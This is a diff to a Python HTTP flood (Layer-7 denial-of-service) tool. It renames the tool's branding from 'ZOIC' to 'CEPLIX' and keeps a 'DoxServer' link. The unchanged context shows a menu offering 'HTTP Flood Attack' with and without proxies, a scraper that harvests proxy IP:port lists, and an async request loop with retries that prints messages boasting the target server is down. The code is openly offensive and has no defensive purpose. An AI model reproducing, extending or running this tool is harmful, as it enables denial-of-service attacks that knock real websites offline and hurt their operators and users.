@@ -6,7 +6,7 @@ import sys
 import os
 import re
 
-zoic = "\033[38;5;118m"
+ceplix = "\033[38;5;118m"
 white = "\033[97m"
 red = "\033[38;5;196m"
 green = "\033[38;5;34m"
@@ -54,7 +54,7 @@ def proxylist(url):
         proxy_list = re.findall(r'\d+\.\d+\.\d+\.\d+:\d+', response.text)
         proxies.extend(proxy_list)
     except Exception as e:
-        print(f"[ZOIC] {e}")
+        print(f"[CEPLIX] {e}")
     return proxies
 
 all_proxies = []
@@ -64,7 +64,7 @@ for site in proxysite:
 
 def logo():
     os.system('cls' if os.name == 'nt' else 'clear')
-    print(f"""{zoic}
+    print(f"""{ceplix}
 ██╗      █████╗ ██╗   ██╗███████╗██████╗     ███████╗
 ██║     ██╔══██╗╚██╗ ██╔╝██╔════╝██╔══██╗    ╚════██║
 ██║     ███████║ ╚████╔╝ █████╗  ██████╔╝        ██╔╝
@@ -73,16 +73,16 @@ def logo():
 ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝       ╚═╝ {clear}
                
 ╔═════════════════════════════════════════════════════╗
-║ {zoic}*{clear} Github    {zoic}:{clear}   https://github.com/madanokr001      ║
-║ {zoic}*{clear} DoxServer {zoic}:{clear}   https://rvlt.gg/PnjMbQwH            ║
-║ {zoic}*{clear} version   {zoic}:{clear}   4.0                                 ║
-║ {zoic}*{clear} ZOIC      {zoic}:{clear}  {zoic}[{clear}{white}LAYER7{clear}{zoic}]{clear}                             ║  
+║ {ceplix}*{clear} Github    {ceplix}:{clear}   https://github.com/ceplix-53        ║
+║ {ceplix}*{clear} DoxServer {ceplix}:{clear}   https://rvlt.gg/PnjMbQwH            ║
+║ {ceplix}*{clear} version   {ceplix}:{clear}   4.0                                 ║
+║ {ceplix}*{clear} CEPLIX    {ceplix}:{clear}  {ceplix}[{clear}{white}LAYER7{clear}{ceplix}]{clear}                             ║  
 ╚═════════════════════════════════════════════════════╝
                
 ╔═════════════════════════════════════════════════════╗
-║ {zoic}[{clear}1{zoic}]{clear} HTTP Flood Attack                               ║
-║ {zoic}[{clear}2{zoic}]{clear} HTTP Flood Attack {zoic}[{clear}{white}PROXY{clear}{zoic}]{clear}                       ║                       
-║ {zoic}[{clear}3{zoic}]{clear} Exit ZOIC                                       ║                                 
+║ {ceplix}[{clear}1{ceplix}]{clear} HTTP Flood Attack                               ║
+║ {ceplix}[{clear}2{ceplix}]{clear} HTTP Flood Attack {ceplix}[{clear}{white}PROXY{clear}{ceplix}]{clear}                       ║                       
+║ {ceplix}[{clear}3{ceplix}]{clear} Exit CEPLIX                                       ║                                 
 ╚═════════════════════════════════════════════════════╝           
 """)
 
@@ -90,8 +90,8 @@ def layer7():
     while True:
         logo()
         select = input(f"""
-╔═══[{zoic}root{clear}@{zoic}ZOIC{clear}]
-╚══{zoic}>{clear} """)
+╔═══[{ceplix}root{clear}@{ceplix}CEPLIX{clear}]
+╚══{ceplix}>{clear} """)
                                         
         if select == "1" or select.lower() == "1":
             async def send_request(session, url, retries=3):
@@ -100,19 +100,19 @@ def layer7():
                 }
                 try:
                     async with session.get(url, headers=headers) as response:
-                        print(f"[{zoic}ZOIC{clear}] Url {zoic}:{clear} {url} {zoic}|{clear} Status {zoic}:{clear} {red}{response.status}{clear}")
+                        print(f"[{ceplix}CEPLIX{clear}] Url {ceplix}:{clear} {url} {ceplix}|{clear} Status {ceplix}:{clear} {red}{response.status}{clear}")
                 except aiohttp.ClientConnectorError:
-                    print(f"[{red}-{clear}] {red}Server has down by ZOIC !!{clear}")
+                    print(f"[{red}-{clear}] {red}Server has down by CEPLIX !!{clear}")
                     if retries > 0:
                         await asyncio.sleep(2)
                         await send_request(session, url, retries - 1)
                 except aiohttp.ServerDisconnectedError:
-                    print(f"[{red}-{clear}] {red}Server has disconnected by ZOIC !!{clear}")
+                    print(f"[{red}-{clear}] {red}Server has disconnected by CEPLIX !!{clear}")
                     if retries > 0:
                         await asyncio.sleep(2)
                         await send_request(session, url, retries - 1)
                 except asyncio.TimeoutError:
-                    print(f"[{red}-{clear}] {red}Server has TIMEOUT by ZOIC !!{clear}")
+                    print(f"[{red}-{clear}] {red}Server has TIMEOUT by CEPLIX !!{clear}")
                     if retries > 0:
                         await asyncio.sleep(2)
                         await send_request(session, url, retries - 1)
